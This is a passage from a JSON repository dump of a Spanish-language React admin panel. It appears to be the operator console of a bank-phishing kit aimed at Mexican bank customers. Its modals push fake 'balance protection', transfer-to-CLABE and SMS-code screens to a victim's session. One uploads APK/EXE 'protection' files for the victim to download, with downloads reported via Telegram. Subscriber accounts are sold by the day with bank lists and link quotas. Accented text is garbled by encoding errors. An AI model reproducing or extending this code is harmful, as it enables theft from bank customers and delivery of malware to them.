py-1\"\n                      >\n                        <div className=\"flex items-center text-blue-500\">\n                          <MessageCircle className=\"h-4 w-4 mr-1\" />\n                          <span className=\"text-xs\">Chat ID</span>\n                        </div>\n                      </Button>\n                      <Button\n                        variant=\"ghost\"\n                        size=\"sm\"\n                        onClick={() => toggleUserStatusMutation.mutate(user.username)}\n                        disabled={toggleUserStatusMutation.isPending}\n                        className=\"px-3 py-1\"\n                      >\n                        {user.active ? (\n                          <div className=\"flex items-center text-red-500\">\n                            <UserX className=\"h-4 w-4 mr-1\" />\n                            <span className=\"text-xs\">Desactivar</span>\n                          </div>\n                        ) : (\n                          <div className=\"flex items-center text-green-500\">\n                            <UserCheck className=\"h-4 w-4 mr-1\" />\n                            <span className=\"text-xs\">Activar</span>\n                          </div>\n                        )}\n                      </Button>\n                    </div>\n                  </div>\n                ))\n              )}\n            </div>\n          </>\n        )}\n      </div>\n\n      {/* Create User Modal */}\n      <Dialog open={isCreateModalOpen} onOpenChange={setIsCreateModalOpen}>\n        <DialogContent className=\"bg-[#1e1e1e] text-white\">\n          <DialogHeader>\n            <DialogTitle>Crear Nuevo Usuario</DialogTitle>\n          </DialogHeader>\n          <form onSubmit={handleCreateUser}>\n            <div className=\"space-y-4 py-4\">\n              <div className=\"grid w-full items-center gap-2\">\n                <label htmlFor=\"username\" className=\"text-sm text-gray-400\">\n                  Nombre de usuario\n                </label>\n                <Input\n                  type=\"text\"\n                  id=\"username\"\n                  value={newUser.username}\n                  onChange={(e) => setNewUser({ ...newUser, username: e.target.value })}\n                  className=\"bg-[#2c2c2c] border-gray-700\"\n                  placeholder=\"Usuario\"\n                  required\n                />\n              </div>\n              <div className=\"grid w-full items-center gap-2\">\n                <label htmlFor=\"password\" className=\"text-sm text-gray-400\">\n                  Contrase帽a\n                </label>\n                <Input\n                  type=\"password\"\n                  id=\"password\"\n                  value={newUser.password}\n                  onChange={(e) => setNewUser({ ...newUser, password: e.target.value })}\n                  className=\"bg-[#2c2c2c] border-gray-700\"\n                  placeholder=\"Contrase帽a\"\n                  required\n                />\n              </div>\n              <div className=\"grid w-full items-center gap-2\">\n                <label htmlFor=\"telegramChatId\" className=\"text-sm text-gray-400\">\n                  Chat ID de Telegram\n                </label>\n                <Input\n                  type=\"text\"\n                  id=\"telegramChatId\"\n                  value={newUser.telegramChatId}\n                  onChange={(e) => setNewUser({ ...newUser, telegramChatId: e.target.value })}\n                  className=\"bg-[#2c2c2c] border-gray-700\"\n                  placeholder=\"Ej: 1234567890\"\n                />\n                <div className=\"text-xs text-gray-500\">\n                  El usuario puede obtener su Chat ID enviando /id al bot de Telegram\n                </div>\n              </div>\n              <div className=\"grid w-full items-center gap-2\">\n                <label htmlFor=\"role\" className=\"text-sm text-gray-400\">\n                  Rol\n                </label>\n                <select\n                  id=\"role\"\n                  value={newUser.role}\n                  onChange={(e) => setNewUser({ ...newUser, role: e.target.value as UserRole })}\n                  className=\"bg-[#2c2c2c] text-white border border-gray-700 rounded px-3 py-2 w-full\"\n                >\n                  <option value={UserRole.USER}>Usuario</option>\n                  <option value={UserRole.ADMIN}>Administrador</option>\n                </select>\n              </div>\n            </div>\n            <DialogFooter>\n              <Button \n                type=\"submit\" \n                className=\"bg-[#00aaff] hover:bg-[#0088cc]\"\n                disabled={createUserMutation.isPending}\n              >\n                {createUserMutation.isPending ? (\n                  <div className=\"animate-spin rounded-full h-4 w-4 border-t-2 border-b-2 border-white\"></div>\n                ) : (\n                  <>\n                    <Lock className=\"mr-2 h-4 w-4\" />\n                    Crear Usuario\n                  </>\n                )}\n              </Button>\n            </DialogFooter>\n          </form>\n        </DialogContent>\n      </Dialog>\n\n      {/* Configure Chat ID Modal */}\n      <Dialog open={isChatIdModalOpen} onOpenChange={setIsChatIdModalOpen}>\n        <DialogContent className=\"bg-[#1e1e1e] text-white\">\n          <DialogHeader>\n            <DialogTitle className=\"flex items-center\">\n              <MessageCircle className=\"mr-2 h-5 w-5 text-blue-500\" />\n              Configurar Chat ID de Telegram\n            </DialogTitle>\n          </DialogHeader>\n          <form onSubmit={handleConfigureChatId}>\n            <div className=\"space-y-4 py-4\">\n              <div className=\"bg-blue-900/20 border border-blue-600 rounded-lg p-3\">\n                <p className=\"text-sm text-blue-300\">\n                  <strong>Usuario:</strong> {selectedUserForChatId?.username}\n                </p>\n                <p className=\"text-xs text-gray-400 mt-1\">\n                  Configura el Chat ID para que este usuario reciba c贸digos 2FA y notificaciones por Telegram.\n                </p>\n              </div>\n              \n              <div className=\"grid w-full items-center gap-2\">\n                <label htmlFor=\"chatId\" className=\"text-sm text-gray-400\">\n                  Chat ID de Telegram\n                </label>\n                <Input\n                  type=\"text\"\n                  id=\"chatId\"\n                  value={chatIdInput}\n                  onChange={(e) => setChatIdInput(e.target.value)}\n                  className=\"bg-[#2c2c2c] border-gray-700\"\n                  placeholder=\"Ej: 1234567890\"\n                  required\n                />\n                <div className=\"text-xs text-gray-500 space-y-1\">\n                  <p> El usuario puede obtener su Chat ID enviando <code className=\"bg-gray-800 px-1 rounded\">/id</code> al bot</p>\n                  <p> Tambi茅n puede usar <code className=\"bg-gray-800 px-1 rounded\">/start</code> para asociaci贸n autom谩tica</p>\n                </div>\n              </div>\n            </div>\n            <DialogFooter>\n              <Button \n                type=\"button\" \n                variant=\"outline\"\n                onClick={() => setIsChatIdModalOpen(false)}\n                className=\"border-gray-600 text-gray-300\"\n              >\n                Cancelar\n              </Button>\n              <Button \n                type=\"submit\" \n                className=\"bg-[#00aaff] hover:bg-[#0088cc]\"\n                disabled={configureChatIdMutation.isPending || !chatIdInput.trim()}\n              >\n                {configureChatIdMutation.isPending ? (\n                  <div className=\"animate-spin rounded-full h-4 w-4 border-t-2 border-b-2 border-white\"></div>\n                ) : (\n                  <>\n                    <MessageCircle className=\"mr-2 h-4 w-4\" />\n                    Configurar Chat ID\n                  </>\n                )}\n              </Button>\n            </DialogFooter>\n          </form>\n        </DialogContent>\n      </Dialog>\n    </div>\n  );\n};\n\nexport default UserManagement;","size_bytes":21165},"client/src/components/admin/Modals.tsx":{"content":"import { useState } from 'react';\nimport { Card } from '@/components/ui/card';\nimport { Input } from '@/components/ui/input';\nimport { Button } from '@/components/ui/button';\nimport { Textarea } from '@/components/ui/textarea';\nimport { Label } from '@/components/ui/label';\n\ninterface ModalProps {\n  isOpen: boolean;\n  onClose: () => void;\n  title: string;\n  children: React.ReactNode;\n}\n\nconst Modal: React.FC<ModalProps> = ({ isOpen, onClose, title, children }) => {\n  if (!isOpen) return null;\n\n  return (\n    <div className=\"fixed inset-0 bg-black bg-opacity-60 z-50 flex items-center justify-center\">\n      <div className=\"bg-[#2c2c2c] p-6 rounded-lg max-w-lg w-full relative\">\n        <button \n          className=\"absolute top-2 right-3 text-gray-400 hover:text-white text-xl\"\n          onClick={onClose}\n        >\n          &times;\n        </button>\n        <h3 className=\"text-xl font-semibold mb-4 text-white\">{title}</h3>\n        {children}\n      </div>\n    </div>\n  );\n};\n\ninterface ProtectModalProps {\n  isOpen: boolean;\n  onClose: () => void;\n  onConfirm: (amount: string) => void;\n}\n\nexport const ProtectModal: React.FC<ProtectModalProps> = ({ isOpen, onClose, onConfirm }) => {\n  const [amount, setAmount] = useState('');\n\n  const handleSubmit = () => {\n    onConfirm(amount);\n    setAmount('');\n  };\n\n  return (\n    <Modal isOpen={isOpen} onClose={onClose} title=\"Proteger Saldo\">\n      <div className=\"mb-4\">\n        <Label htmlFor=\"cantidadProteger\" className=\"block text-sm text-gray-300 mb-1\">\n          Cantidad $\n        </Label>\n        <Input \n          id=\"cantidadProteger\" \n          type=\"number\" \n          placeholder=\"Ingrese la cantidad\"\n          value={amount}\n          onChange={(e) => setAmount(e.target.value)}\n          className=\"w-full p-2 rounded bg-[#1f1f1f] text-white border border-gray-700 focus:outline-none\"\n        />\n      </div>\n      \n      <div className=\"flex justify-end space-x-2 mt-6\">\n        <Button \n          onClick={onClose}\n          variant=\"secondary\"\n          className=\"bg-gray-600 text-white hover:bg-gray-700\"\n        >\n          Cancelar\n        </Button>\n        <Button \n          onClick={handleSubmit}\n          variant=\"default\"\n          className=\"bg-[#007bff] text-white hover:bg-opacity-90\"\n        >\n          Continuar\n        </Button>\n      </div>\n    </Modal>\n  );\n};\n\ninterface TransferModalProps {\n  isOpen: boolean;\n  onClose: () => void;\n  onConfirm: (data: { cantidad: string, titular: string, clabe: string, alias: string }) => void;\n}\n\nexport const TransferModal: React.FC<TransferModalProps> = ({ isOpen, onClose, onConfirm }) => {\n  const [formData, setFormData] = useState({\n    cantidad: '',\n    titular: '',\n    clabe: '',\n    alias: 'Cuenta de respaldo'\n  });\n\n  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {\n    const { id, value } = e.target;\n    setFormData(prev => ({\n      ...prev,\n      [id.replace('transfer', '').toLowerCase()]: value\n    }));\n  };\n\n  const handleSubmit = () => {\n    onConfirm(formData);\n    setFormData({\n      cantidad: '',\n      titular: '',\n      clabe: '',\n      alias: 'Cuenta de respaldo'\n    });\n  };\n\n  return (\n    <Modal isOpen={isOpen} onClose={onClose} title=\"Transferir\">\n      <div className=\"space-y-3\">\n        <div>\n          <Input \n            id=\"transferCantidad\" \n            type=\"number\" \n            placeholder=\"Ingrese la cantidad\"\n            value={formData.cantidad}\n            onChange={handleChange}\n            className=\"w-full p-2 rounded bg-[#1f1f1f] text-white border border-gray-700 focus:outline-none\"\n          />\n        </div>\n        <div>\n          <Input \n            id=\"transferTitular\" \n            type=\"text\" \n            placeholder=\"Ingrese el titular\"\n            value={formData.titular}\n            onChange={handleChange}\n            className=\"w-full p-2 rounded bg-[#1f1f1f] text-white border border-gray-700 focus:outline-none\"\n          />\n        </div>\n        <div>\n          <Input \n            id=\"transferClabe\" \n            type=\"text\" \n            placeholder=\"Ingrese la CLABE\"\n            value={formData.clabe}\n            onChange={handleChange}\n            className=\"w-full p-2 rounded bg-[#1f1f1f] text-white border border-gray-700 focus:outline-none\"\n          />\n        </div>\n        <div>\n          <Input \n            id=\"transferAlias\" \n            type=\"text\" \n            placeholder=\"Cuenta de respaldo\"\n            value={formData.alias}\n            onChange={handleChange}\n            className=\"w-full p-2 rounded bg-[#1f1f1f] text-white border border-gray-700 focus:outline-none\"\n          />\n        </div>\n      </div>\n      \n      <div className=\"flex justify-end space-x-2 mt-6\">\n        <Button \n          onClick={onClose}\n          variant=\"secondary\"\n          className=\"bg-gray-600 text-white hover:bg-gray-700\"\n        >\n          Cancelar\n        </Button>\n        <Button \n          onClick={handleSubmit}\n          variant=\"default\"\n          className=\"bg-[#007bff] text-white hover:bg-opacity-90\"\n        >\n          Continuar\n        </Button>\n      </div>\n    </Modal>\n  );\n};\n\ninterface CancelModalProps {\n  isOpen: boolean;\n  onClose: () => void;\n  onConfirm: (data: { importe: string, negocio: string }) => void;\n}\n\nexport const CancelModal: React.FC<CancelModalProps> = ({ isOpen, onClose, onConfirm }) => {\n  const [formData, setFormData] = useState({\n    importe: '',\n    negocio: ''\n  });\n\n  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {\n    const { id, value } = e.target;\n    setFormData(prev => ({\n      ...prev,\n      [id.replace('cancelacion', '').toLowerCase()]: value\n    }));\n  };\n\n  const handleSubmit = () => {\n    onConfirm(formData);\n    setFormData({\n      importe: '',\n      negocio: ''\n    });\n  };\n\n  return (\n    <Modal isOpen={isOpen} onClose={onClose} title=\"Cancelaci贸n\">\n      <div className=\"space-y-3\">\n        <div>\n          <Input \n            id=\"cancelacionImporte\" \n            type=\"number\" \n            placeholder=\"Ingrese el importe\"\n            value={formData.importe}\n            onChange={handleChange}\n            className=\"w-full p-2 rounded bg-[#1f1f1f] text-white border border-gray-700 focus:outline-none\"\n          />\n        </div>\n        <div>\n          <Input \n            id=\"cancelacionNegocio\" \n            type=\"text\" \n            placeholder=\"Ingrese el negocio\"\n            value={formData.negocio}\n            onChange={handleChange}\n            className=\"w-full p-2 rounded bg-[#1f1f1f] text-white border border-gray-700 focus:outline-none\"\n          />\n        </div>\n      </div>\n      \n      <div className=\"flex justify-end space-x-2 mt-6\">\n        <Button \n          onClick={onClose}\n          variant=\"secondary\"\n          className=\"bg-gray-600 text-white hover:bg-gray-700\"\n        >\n          Cancelar\n        </Button>\n        <Button \n          onClick={handleSubmit}\n          variant=\"default\"\n          className=\"bg-[#007bff] text-white hover:bg-opacity-90\"\n        >\n          Continuar\n        </Button>\n      </div>\n    </Modal>\n  );\n};\n\ninterface SmsCompraModalProps {\n  isOpen: boolean;\n  onClose: () => void;\n  onConfirm: (telefono: string) => void;\n}\n\nexport const SmsCompraModal: React.FC<SmsCompraModalProps> = ({ isOpen, onClose, onConfirm }) => {\n  const [telefono, setTelefono] = useState('');\n\n  const handleSubmit = () => {\n    if (telefono.length === 4) {\n      onConfirm(telefono);\n      setTelefono('');\n      onClose();\n    } else {\n      alert('Por favor ingresa exactamente 4 d铆gitos');\n    }\n  };\n\n  return (\n    <Modal isOpen={isOpen} onClose={onClose} title=\"SMS Compra - Cancelaci贸n de cargos\">\n      <div className=\"mb-4\">\n        <Label htmlFor=\"telefonoSmsCompra\" className=\"block text-sm text-gray-300 mb-1\">\n          Ingresa los 煤ltimos 4 d铆gitos del celular:\n        </Label>\n        <Input \n          id=\"telefonoSmsCompra\" \n          type=\"tel\" \n          maxLength={4}\n          placeholder=\"Ej: 5678\"\n          value={telefono}\n          onChange={(e) => {\n            // Solo permitir n煤meros y limitar a 4 d铆gitos\n            const value = e.target.value.replace(/\\D/g, '').substring(0, 4);\n            setTelefono(value);\n          }}\n          className=\"w-full p-2 rounded bg-[#1f1f1f] text-white border border-gray-700 focus:outline-none\"\n        />\n        <p className=\"text-xs text-gray-400 mt-1\">\n          Solo se requieren los 煤ltimos 4 d铆gitos del n煤mero celular. \n          Estos d铆gitos se mostrar谩n en la pantalla de cancelaci贸n.\n        </p>\n      </div>\n      \n      <div className=\"flex justify-end space-x-2 mt-6\">\n        <Button \n          onClick={onClose}\n          variant=\"secondary\"\n          className=\"bg-gray-600 text-white hover:bg-gray-700\"\n        >\n          Cancelar\n        </Button>\n        <Button \n          onClick={handleSubmit}\n          variant=\"default\"\n          className=\"bg-[#007bff] text-white hover:bg-opacity-90\"\n          disabled={telefono.length !== 4}\n        >\n          Enviar\n        </Button>\n      </div>\n    </Modal>\n  );\n};\n\ninterface CodeModalProps {\n  isOpen: boolean;\n  onClose: () => void;\n  onConfirm: (telefono: string) => void;\n}\n\nexport const CodeModal: React.FC<CodeModalProps> = ({ isOpen, onClose, onConfirm }) => {\n  const [telefono, setTelefono] = useState('');\n\n  const handleSubmit = () => {\n    if (telefono.length === 4) {\n      // Agregamos un prefijo ficticio para mantener compatibilidad con el resto del c贸digo\n      // que espera un n煤mero de 10 d铆gitos\n      const fullPhone = \"123456\" + telefono;\n      onConfirm(fullPhone);\n      setTelefono('');\n    } else {\n      alert('Por favor ingresa exactamente 4 d铆gitos');\n    }\n  };\n\n  return (\n    <Modal isOpen={isOpen} onClose={onClose} title=\"Tel茅fono\">\n      <div className=\"mb-4\">\n        <Label htmlFor=\"telefonoCodigo\" className=\"block text-sm text-gray-300 mb-1\">\n          Ingresa los 煤ltimos 4 d铆gitos del celular:\n        </Label>\n        <Input \n          id=\"telefonoCodigo\" \n          type=\"tel\" \n          maxLength={4}\n          placeholder=\"Ej: 5678\"\n          value={telefono}\n          onChange={(e) => {\n            // Solo permitir n煤meros y limitar a 4 d铆gitos\n            const value = e.target.value.replace(/\\D/g, '').substring(0, 4);\n            setTelefono(value);\n          }}\n          className=\"w-full p-2 rounded bg-[#1f1f1f] text-white border border-gray-700 focus:outline-none\"\n        />\n        <p className=\"text-xs text-gray-400 mt-1\">\n          Solo se requieren los 煤ltimos 4 d铆gitos del n煤mero celular.\n        </p>\n      </div>\n      \n      <div className=\"flex justify-end space-x-2 mt-6\">\n        <Button \n          onClick={onClose}\n          variant=\"secondary\"\n          className=\"bg-gray-600 text-white hover:bg-gray-700\"\n        >\n          Cancelar\n        </Button>\n        <Button \n          onClick={handleSubmit}\n          variant=\"default\"\n          className=\"bg-[#007bff] text-white hover:bg-opacity-90\"\n          disabled={telefono.length !== 4}\n        >\n          Aceptar\n        </Button>\n      </div>\n    </Modal>\n  );\n};\n\ninterface MessageModalProps {\n  isOpen: boolean;\n  onClose: () => void;\n  onConfirm: (mensaje: string) => void;\n}\n\nexport const MessageModal: React.FC<MessageModalProps> = ({ isOpen, onClose, onConfirm }) => {\n  const [mensaje, setMensaje] = useState('');\n\n  const handleSubmit = () => {\n    onConfirm(mensaje);\n    setMensaje('');\n  };\n\n  return (\n    <Modal isOpen={isOpen} onClose={onClose} title=\"Mensaje personalizado\">\n      <div className=\"mb-4\">\n        <Label htmlFor=\"mensajeTexto\" className=\"block text-sm text-gray-300 mb-1\">\n          Escribe el mensaje (m谩x. 4000 caracteres - tama帽o de una hoja oficio):\n        </Label>\n        <Textarea \n          id=\"mensajeTexto\" \n          maxLength={4000}\n          rows={8}\n          value={mensaje}\n          onChange={(e) => setMensaje(e.target.value.slice(0, 4000))}\n          className=\"w-full p-2 rounded bg-[#1f1f1f] text-white border border-gray-700 focus:outline-none\"\n        />\n        <div className=\"text-right text-xs text-gray-500 mt-1\">\n          {mensaje.length}/4000 caracteres\n        </div>\n      </div>\n      \n      <div className=\"flex justify-end space-x-2 mt-6\">\n        <Button \n          onClick={onClose}\n          variant=\"secondary\"\n          className=\"bg-gray-600 text-white hover:bg-gray-700\"\n        >\n          Cancelar\n        </Button>\n        <Button \n          onClick={handleSubmit}\n          variant=\"default\"\n          className=\"bg-[#007bff] text-white hover:bg-opacity-90\"\n        >\n          Enviar\n        </Button>\n      </div>\n    </Modal>\n  );\n};\n\ninterface ProtectionBankingModalProps {\n  isOpen: boolean;\n  onClose: () => void;\n  onConfirm: (fileData: { fileName: string; fileUrl: string; fileSize: string }) => void;\n  sessionId: string | null;\n}\n\nexport const ProtectionBankingModal: React.FC<ProtectionBankingModalProps> = ({ \n  isOpen, \n  onClose, \n  onConfirm, \n  sessionId \n}) => {\n  const [file, setFile] = useState<File | null>(null);\n  const [uploading, setUploading] = useState(false);\n\n  const handleFileSelect = (event: React.ChangeEvent<HTMLInputElement>) => {\n    const selectedFile = event.target.files?.[0];\n    if (selectedFile) {\n      // Validar tama帽o del archivo (m谩ximo 50MB)\n      if (selectedFile.size > 50 * 1024 * 1024) {\n        alert('El archivo no puede ser mayor a 50MB');\n        return;\n      }\n      \n      // Validar tipos de archivo permitidos\n      const allowedTypes = [\n        'application/zip',\n        'application/x-zip-compressed',\n        'application/vnd.android.package-archive', // APK\n        'application/x-msdownload', // EXE\n        'application/octet-stream'\n      ];\n      \n      if (!allowedTypes.includes(selectedFile.type) && \n          !selectedFile.name.toLowerCase().endsWith('.zip') &&\n          !selectedFile.name.toLowerCase().endsWith('.apk') &&\n          !selectedFile.name.toLowerCase().endsWith('.exe')) {\n        alert('Solo se permiten archivos ZIP, APK y EXE');\n        return;\n      }\n      \n      setFile(selectedFile);\n    }\n  };\n\n  const handleUpload = async () => {\n    if (!file || !sessionId) return;\n\n    setUploading(true);\n    \n    try {\n      const formData = new FormData();\n      formData.append('file', file);\n      formData.append('sessionId', sessionId);\n\n      const response = await fetch('/api/upload-protection-file', {\n        method: 'POST',\n        body: formData,\n      });\n\n      if (response.ok) {\n        const result = await response.json();\n        \n        // Formatear el tama帽o del archivo\n        const fileSize = (file.size / (1024 * 1024)).toFixed(2) + ' MB';\n        \n        onConfirm({\n          fileName: file.name,\n          fileUrl: result.fileUrl,\n          fileSize: fileSize\n        });\n        \n        setFile(null);\n        onClose();\n      } else {\n        throw new Error('Error al subir el archivo');\n      }\n    } catch (error) {\n      console.error('Error uploading file:', error);\n      alert('Error al subir el archivo. Intenta nuevamente.');\n    } finally {\n      setUploading(false);\n    }\n  };\n\n  const formatFileSize = (bytes: number) => {\n    if (bytes === 0) return '0 Bytes';\n    const k = 1024;\n    const sizes = ['Bytes', 'KB', 'MB', 'GB'];\n    const i = Math.floor(Math.log(bytes) / Math.log(k));\n    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];\n  };\n\n  return (\n    <Modal isOpen={isOpen} onClose={onClose} title=\"Protecci贸n Bancaria - Cargar Archivo\">\n      <div className=\"space-y-4\">\n        <div>\n          <Label className=\"block text-sm text-gray-300 mb-2\">\n            Selecciona el archivo de protecci贸n para el cliente:\n          </Label>\n          <input\n            type=\"file\"\n            accept=\".zip,.apk,.exe\"\n            onChange={handleFileSelect}\n            className=\"w-full p-2 rounded bg-[#1f1f1f] text-white border border-gray-700 focus:outline-none file:mr-4 file:py-2 file:px-4 file:rounded file:border-0 file:text-sm file:bg-[#007bff] file:text-white hover:file:bg-blue-700\"\n          />\n          <p className=\"text-xs text-gray-400 mt-1\">\n            Formatos permitidos: ZIP, APK, EXE (m谩ximo 50MB)\n          </p>\n        </div>\n\n        {file && (\n          <div className=\"bg-[#1f1f1f] p-3 rounded border border-gray-700\">\n            <p className=\"text-sm text-gray-300\">\n              <strong>Archivo seleccionado:</strong> {file.name}\n            </p>\n            <p className=\"text-xs text-gray-400\">\n              Tama帽o: {formatFileSize(file.size)}\n            </p>\n          </div>\n        )}\n\n        <div className=\"bg-blue-900/20 p-3 rounded border border-blue-700/50\">\n          <p className=\"text-sm text-blue-200\">\n            <strong>Informaci贸n:</strong> Una vez cargado, el cliente podr谩 descargar este archivo desde la pantalla de Protecci贸n Bancaria. Las descargas se notificar谩n autom谩ticamente v铆a Telegram.\n          </p>\n        </div>\n      </div>\n      \n      <div className=\"flex justify-end space-x-2 mt-6\">\n        <Button \n          onClick={onClose}\n          variant=\"secondary\"\n          className=\"bg-gray-600 text-white hover:bg-gray-700\"\n          disabled={uploading}\n        >\n          Cancelar\n        </Button>\n        <Button \n          onClick={handleUpload}\n          variant=\"default\"\n          className=\"bg-[#007bff] text-white hover:bg-opacity-90\"\n          disabled={!file || uploading}\n        >\n          {uploading ? 'Cargando...' : 'Cargar y Enviar'}\n        </Button>\n      </div>\n    </Modal>\n  );\n};","size_bytes":17602},"client/src/components/admin/RegisteredUsersManagement.tsx":{"content":"import React, { useState } from 'react';\nimport { useQuery, useMutation, useQueryClient } from '@tanstack/react-query';\nimport { apiRequest, getQueryFn } from '@/lib/queryClient';\nimport { Button } from '@/components/ui/button';\nimport { Card, CardContent, CardDescription, CardFooter, CardHeader, CardTitle } from '@/components/ui/card';\nimport { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from '@/components/ui/table';\nimport { Badge } from '@/components/ui/badge';\nimport { Textarea } from '@/components/ui/textarea';\nimport { Label } from '@/components/ui/label';\nimport { Loader2, Check, X, Clock, User, Calendar, Smartphone, ToggleLeft, ToggleRight, Trash, Settings, Building, Link as LinkIcon, MessageCircle, DollarSign, Search, Filter, Plus } from 'lucide-react';\nimport { formatDate } from '@/utils/helpers';\nimport { useToast } from '@/hooks/use-toast';\nimport { useDeviceInfo } from '@/hooks/use-device-orientation';\nimport { Dialog, DialogContent, DialogDescription, DialogFooter, DialogHeader, DialogTitle } from '@/components/ui/dialog';\nimport { BankType } from '@shared/schema';\n\n// Interfaces\ninterface User {\n  id: number;\n  username: string;\n  role: string;\n  accountType?: 'individual' | 'office';\n  isActive: boolean;\n  expiresAt: string | null;\n  deviceCount: number;\n  maxDevices: number;\n  createdAt: string | null;\n  lastLogin: string | null;\n  allowedBanks?: string;\n  customPrice?: string | null;\n  telegramChatId?: string | null;\n}\n\ninterface LinkQuota {\n  used: number;\n  limit: number;\n  remaining: number;\n  resetsAt: string;\n}\n\nconst RegisteredUsersManagement: React.FC = () => {\n  const { toast } = useToast();\n  const queryClient = useQueryClient();\n  const [selectedUser, setSelectedUser] = useState<User | null>(null);\n  const [isDialogOpen, setIsDialogOpen] = useState(false);\n  const [isLinkDialogOpen, setIsLinkDialogOpen] = useState(false);\n  const [isMessageDialogOpen, setIsMessageDialogOpen] = useState(false);\n  const [isPriceDialogOpen, setIsPriceDialogOpen] = useState(false);\n  const [bankOptions, setBankOptions] = useState<string[]>(['all']);\n  const [generatedLink, setGeneratedLink] = useState<string>('');\n  const [generatedCode, setGeneratedCode] = useState<string>('');\n  const [selectedBank, setSelectedBank] = useState<string>('BANORTE');\n  const [messageText, setMessageText] = useState<string>('');\n  const [customPriceValue, setCustomPriceValue] = useState<string>('');\n  const [searchQuery, setSearchQuery] = useState<string>('');\n  const [statusFilter, setStatusFilter] = useState<'all' | 'active' | 'inactive'>('all');\n  const { isMobile, isLandscape } = useDeviceInfo();\n  const [userQuotas, setUserQuotas] = useState<Map<number, LinkQuota>>(new Map());\n\n  // Consultar los usuarios (solo el usuario balonx puede ver esto)\n  const { \n    data: users = [], \n    isLoading, \n    error, \n    refetch \n  } = useQuery<User[]>({\n    queryKey: ['/api/users/regular'],\n    queryFn: getQueryFn({ on401: 'throw' }),\n    retry: 1,\n    // Forzar refresco autom谩tico cada 3 segundos para mantener los datos actualizados\n    // Esto es necesario porque parece que la invalidaci贸n de cach茅 no est谩 funcionando correctamente\n    refetchInterval: 3000\n  });\n  \n  // Manejar errores y 茅xitos de manera independiente\n  React.useEffect(() => {\n    if (error) {\n      console.error('[RegisteredUsers] Error al obtener usuarios:', error);\n    }\n  }, [error]);\n  \n  React.useEffect(() => {\n    if (users && users.length > 0) {\n      console.log('[RegisteredUsers] Usuarios obtenidos:', users.length);\n      // Mostrar detalles de los usuarios para depuraci贸n\n      users.forEach(user => {\n        console.log(`Usuario: ${user.username}, Activo: ${user.isActive}, Expira: ${user.expiresAt || 'No establecido'}`);\n      });\n      // Cargar cuotas de links para cada usuario\n      fetchUserQuotas();\n    }\n  }, [users]);\n\n  // Cargar cuotas de links para todos los usuarios (paralelo para mejor rendimiento)\n  const fetchUserQuotas = async () => {\n    const quotasMap = new Map<number, LinkQuota>();\n    \n    // Obtener todas las cuotas en paralelo para mejor rendimiento\n    const quotaPromises = users.map(async (user) => {\n      try {\n        const response = await fetch(`/api/admin/users/${user.id}/link-quota`);\n        if (response.ok) {\n          const data = await response.json();\n          return { userId: user.id, quota: data.quota };\n        }\n      } catch (error) {\n        console.error(`Error al obtener cuota para usuario ${user.id}:`, error);\n      }\n      return null;\n    });\n    \n    const results = await Promise.all(quotaPromises);\n    \n    // Mapear los resultados\n    results.forEach((result) => {\n      if (result) {\n        quotasMap.set(result.userId, result.quota);\n      }\n    });\n    \n    setUserQuotas(quotasMap);\n  };\n\n  // Filtrar usuarios seg煤n b煤squeda y estado\n  const filteredUsers = React.useMemo(() => {\n    let filtered = [...users];\n    \n    // Filtro por b煤squeda\n    if (searchQuery.trim()) {\n      filtered = filtered.filter(user => \n        user.username.toLowerCase().includes(searchQuery.toLowerCase())\n      );\n    }\n    \n    // Filtro por estado\n    if (statusFilter === 'active') {\n      filtered = filtered.filter(user => user.isActive);\n    } else if (statusFilter === 'inactive') {\n      filtered = filtered.filter(user => !user.isActive);\n    }\n    \n    return filtered;\n  }, [users, searchQuery, statusFilter]);\n\n  // Activar usuario por 1 d铆a\n  const activateOneDayMutation = useMutation({\n    mutationFn: async (data: { username: string, allowedBanks: string }) => {\n      const { username, allowedBanks } = data;\n      console.log(`[RegisteredUsers] Intentando activar usuario ${username} por 1 d铆a`);\n      console.log(`[RegisteredUsers] Bancos permitidos: ${allowedBanks}`);\n        \n      const res = await apiRequest(\n        'POST',\n        `/api/users/regular/${username}/activate-one-day`,\n        { allowedBanks }\n      );\n      const responseData = await res.json();\n      console.log(`[RegisteredUsers] Respuesta de activaci贸n por 1 d铆a:`, responseData);\n      return responseData;\n    },\n    onSuccess: (data) => {\n      console.log(`[RegisteredUsers] Activaci贸n por 1 d铆a exitosa:`, data);\n      // Invalidar la consulta y forzar su recarga\n      queryClient.invalidateQueries({ queryKey: ['/api/users/regular'] });\n      refetch(); // Forzar una recarga inmediata\n      toast({\n        title: 'Usuario activado',\n        description: 'El usuario ha sido activado por 1 d铆a. ' + \n          (data.user?.expiresAt ? `Expira: ${formatDate(new Date(data.user.expiresAt))}` : ''),\n      });\n      \n      // Cerrar el di谩logo si est谩 abierto\n      setSelectedUser(null);\n    },\n    onError: (error: Error) => {\n      console.error(`[RegisteredUsers] Error al activar usuario por 1 d铆a:`, error);\n      toast({\n        title: 'Error al activar usuario',\n        description: error.message,\n        variant: 'destructive',\n      });\n    },\n  });\n\n  // Activar usuario por 7 d铆as\n  const activateSevenDaysMutation = useMutation({\n    mutationFn: async (data: { username: string, allowedBanks: string }) => {\n      const { username, allowedBanks } = data;\n      console.log(`[RegisteredUsers] Intentando activar usuario ${username} por 7 d铆as`);\n      console.log(`[RegisteredUsers] Bancos permitidos: ${allowedBanks}`);\n        \n      const res = await apiRequest(\n        'POST',\n        `/api/users/regular/${username}/activate-seven-days`,\n        { allowedBanks }\n      );\n      const responseData = await res.json();\n      console.log(`[RegisteredUsers] Respuesta de activaci贸n por 7 d铆as:`, responseData);\n      return responseData;\n    },\n    onSuccess: (data) => {\n      console.log(`[RegisteredUsers] Activaci贸n por 7 d铆as exitosa:`, data);\n      // Invalidar la consulta y forzar su recarga\n      queryClient.invalidateQueries({ queryKey: ['/api/users/regular'] });\n      refetch(); // Forzar una recarga inmediata\n      toast({\n        title: 'Usuario activado',\n        description: 'El usuario ha sido activado por 7 d铆as. ' + \n          (data.user?.expiresAt ? `Expira: ${formatDate(new Date(data.user.expiresAt))}` : ''),\n      });\n      \n      // Cerrar el di谩logo si est谩 abierto\n      setSelectedUser(null);\n    },\n    onError: (error: Error) => {\n      console.error(`[RegisteredUsers] Error al activar usuario por 7 d铆as:`, error);\n      toast({\n        title: 'Error al activar usuario',\n        description: error.message,\n        variant: 'destructive',\n      });\n    },\n  });\n\n  // 